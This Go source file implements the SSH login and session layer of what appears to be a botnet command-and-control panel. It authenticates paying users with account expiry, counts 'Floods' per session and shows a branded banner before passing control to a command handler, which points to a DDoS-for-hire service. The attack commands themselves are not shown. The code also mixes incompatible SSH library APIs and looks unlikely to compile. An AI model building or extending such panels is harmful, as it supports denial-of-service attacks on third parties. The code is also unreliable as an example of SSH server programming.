package masters

import (
    "cnc/core/config"
    "cnc/core/database"
    "cnc/core/masters/sessions"
    "cnc/core/utils"
    "crypto/rand"
    "crypto/rsa"
    "crypto/x509"
    "encoding/pem"
    "fmt"
    "golang.org/x/crypto/ssh"
    "io"
    "net"
    "os"
    "strings"
    "sync"
    "time"
)

var GlobalSlots int

// SSH session structure to manage SSH connections
type SSHSession struct {
    Conn        net.Conn
    Channel     ssh.Channel
    Requests    <-chan *ssh.Request
    Admin       *Admin
    Username    string
    IsClosed    bool
    CloseMutex  sync.Mutex
}

// SSH server configuration
var sshServer *ssh.Server

func Listen() {
    // Generate or load SSH host key
    privateKey, err := generateOrLoadHostKey()
    if err != nil {
        utils.Errorf("Failed to generate SSH host key: %v", err)
        return
    }

    // Configure SSH server
    sshServer = &ssh.Server{
        Addr:             fmt.Sprintf("%s:%d", config.Config.Server.Host, config.Config.Server.Port),
        Handler:          handleSSHConnection,
        PasswordCallback: authenticateSSHUser,
        IdleTimeout:      30 * time.Minute,
        Version:          "SSH-2.0-CNC-Server",
    }

    // Add RSA host key
    privateKeySigner, err := ssh.NewSignerFromKey(privateKey)
    if err != nil {
        utils.Errorf("Failed to create SSH signer: %v", err)
        return
    }

    sshServer.AddHostKey(privateKeySigner)

    utils.Infof("Starting SSH server on port %d", config.Config.Server.Port)
    
    if err := sshServer.ListenAndServe(); err != nil {
        utils.Errorf("SSH Server Error: %v", err)
    }
}

// generateOrLoadHostKey generates or loads an RSA host key for SSH
func generateOrLoadHostKey() (*rsa.PrivateKey, error) {
    // Try to load existing key
    if _, err := os.Stat("./assets/ssh_host_key"); err == nil {
        privateKeyBytes, err := os.ReadFile("./assets/ssh_host_key")
        if err != nil {
            return nil, err
        }

        privateKey, err := ssh.ParseRawPrivateKey(privateKeyBytes)
        if err != nil {
            return nil, err
        }

        return privateKey.(*rsa.PrivateKey), nil
    }

    // Generate new key
    privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
    if err != nil {
        return nil, err
    }

    // Save key to file
    privateKeyBytes, err := x509.MarshalPKCS8PrivateKey(privateKey)
    if err != nil {
        return nil, err
    }

    privateKeyPEM := &pem.Block{
        Type:  "PRIVATE KEY",
        Bytes: privateKeyBytes,
    }

    if err := os.WriteFile("./assets/ssh_host_key", pem.EncodeToMemory(privateKeyPEM), 0600); err != nil {
        return nil, err
    }

    utils.Infof("Generated new SSH host key")
    return privateKey, nil
}

// authenticateSSHUser handles SSH password authentication
func authenticateSSHUser(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
    username := conn.User()
    
    // Trim whitespace from password to ensure consistent comparison
    passwordStr := string(password)
    passwordStr = strings.TrimSpace(passwordStr)

    utils.Infof("SSH login attempt from %s with username: %s", conn.RemoteAddr().String(), username)

    // Authenticate using existing database logic
    loggedIn, userInfo, err := database.DatabaseConnection.TryLogin(username, passwordStr, conn.RemoteAddr().String())
    if err != nil {
        utils.Errorf("SSH authentication error for %s: %v", username, err)
        return nil, fmt.Errorf("authentication failed")
    }

    if !loggedIn {
        utils.Errorf("SSH authentication failed for %s from %s", username, conn.RemoteAddr().String())
        return nil, fmt.Errorf("authentication failed")
    }

    // Check expiry
    if time.Now().After(userInfo.Expiry) {
        utils.Errorf("SSH login attempt with expired account: %s", username)
        return nil, fmt.Errorf("account expired")
    }

    utils.Infof("SSH login successful for %s from %s", username, conn.RemoteAddr().String())
    
    // Return permissions with username for later use
    return &ssh.Permissions{
        Extensions: map[string]string{
            "username": username,
        },
    }, nil
}

// handleSSHConnection handles new SSH connections
func handleSSHConnection(conn ssh.ConnMetadata, channel ssh.Channel, reqs <-chan *ssh.Request) {
    username := conn.User()
    remoteAddr := conn.RemoteAddr().String()

    utils.Infof("New SSH connection from %s as user: %s", remoteAddr, username)

    // Create SSH session
    sshSession := &SSHSession{
        Conn:     conn.Conn(),
        Channel:  channel,
        Requests: reqs,
        Username: username,
    }

    // Create admin connection wrapper for SSH
    admin := NewSSHAdmin(sshSession)
    sshSession.Admin = admin

    // Handle session requests
    go handleSSHRequests(sshSession)

    // Handle interactive session
    handleSSHInteractive(sshSession)
}

// handleSSHRequests handles SSH channel requests
func handleSSHRequests(session *SSHSession) {
    for req := range session.Requests {
        switch req.Type {
        case "shell":
            // Accept shell requests
            req.Reply(true, nil)
        case "exec":
            // Handle exec requests if needed
            req.Reply(true, nil)
        case "pty-req":
            // Accept PTY requests for interactive terminal
            req.Reply(true, nil)
        case "window-change":
            // Handle window size changes
            req.Reply(true, nil)
        default:
            // Reject unknown requests
            req.Reply(false, nil)
        }
    }
}

// handleSSHInteractive handles the interactive SSH session
func handleSSHInteractive(session *SSHSession) {
    defer session.Close()

    // Get user info for session
    userInfo, err := database.DatabaseConnection.GetAccountInfo(session.Username)
    if err != nil {
        utils.Errorf("Failed to get user info for %s: %v", session.Username, err)
        return
    }

    // Create session
    sshSession := &sessions.Session{
        ID:       time.Now().UnixNano(),
        Username: session.Username,
        Conn:     session,
        Account:  userInfo,
        Floods:   0,
    }

    sessions.SessionMutex.Lock()
    sessions.Sessions[sshSession.ID] = sshSession
    sessions.SessionMutex.Unlock()
    session.Admin.Session = sshSession

    defer sshSession.Remove()

    // Display banner
    if err := Displayln(session.Admin, "./assets/branding/user/banner.txt", session.Username); err != nil {
        utils.Errorf("Error displaying banner for %s: %v", session.Username, err)
        return
    }

    // Handle commands
    session.Admin.Commands()
}

// Close closes the SSH session
func (s *SSHSession) Close() {
    s.CloseMutex.Lock()
    defer s.CloseMutex.Unlock()
    
    if s.IsClosed {
        return
    }
    s.IsClosed = true

    if s.Channel != nil {
        s.Channel.Close()
    }
    if s.Conn != nil {
        s.Conn.Close()
    }
}

// Write implements net.Conn for SSH sessions
func (s *SSHSession) Write(b []byte) (n int, err error) {
    if s.IsClosed || s.Channel == nil {
        return 0, io.EOF
    }
    return s.Channel.Write(b)
}

// Read implements net.Conn for SSH sessions
func (s *SSHSession) Read(b []byte) (n int, err error) {
    if s.IsClosed || s.Channel == nil {
        return 0, io.EOF
    }
    return s.Channel.Read(b)
}

// LocalAddr implements net.Conn for SSH sessions
func (s *SSHSession) LocalAddr() net.Addr {
    return s.Conn.LocalAddr()
}

// RemoteAddr implements net.Conn for SSH sessions
func (s *SSHSession) RemoteAddr() net.Addr {
    return s.Conn.RemoteAddr()
}

// SetDeadline implements net.Conn for SSH sessions
func (s *SSHSession) SetDeadline(t time.Time) error {
    return s.Conn.SetDeadline(t)
}

// SetReadDeadline implements net.Conn for SSH sessions
func (s *SSHSession) SetReadDeadline(t time.Time) error {
    return s.Conn.SetReadDeadline(t)
}

// SetWriteDeadline implements net.Conn for SSH sessions
func (s *SSHSession) SetWriteDeadline(t time.Time) error {
    return s.Conn.SetWriteDeadline(t)
}
